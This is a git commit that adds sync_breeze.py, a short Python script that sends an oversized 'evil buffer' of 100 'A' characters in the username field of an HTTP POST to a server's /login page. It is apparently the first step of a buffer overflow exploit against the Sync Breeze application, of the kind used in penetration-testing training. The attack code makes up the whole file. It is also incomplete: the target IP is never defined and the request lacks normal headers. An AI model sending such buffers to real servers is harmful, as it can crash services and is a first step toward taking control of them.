2dce5f096c058c5d19ca85fbf69d149ca27ca770
git <git-user@synology.com>
2023-04-14 19:33:00 +0200

    No content in file, fixed

---
+++ sync_breeze.py
@@ -0,0 +1,30 @@
+#!/usr/bin/python
+import socket
+
+
+
+try:
+    print("\nSending evil buffer ")
+
+    size = 100
+    inputBuffer = "A"*size
+
+    content = "username=" + inputBuffer + "&password=A"
+
+    buffer = "POST /login HTTP/1.1\r\n"
+    buffer += "\r\n"
+
+    buffer += content
+
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+
+    s.connect((IP, 80))
+
+    s.send(buffer)
+
+    s.close()
+
+    print("Done")
+
+except:
+    print("Could not connect")
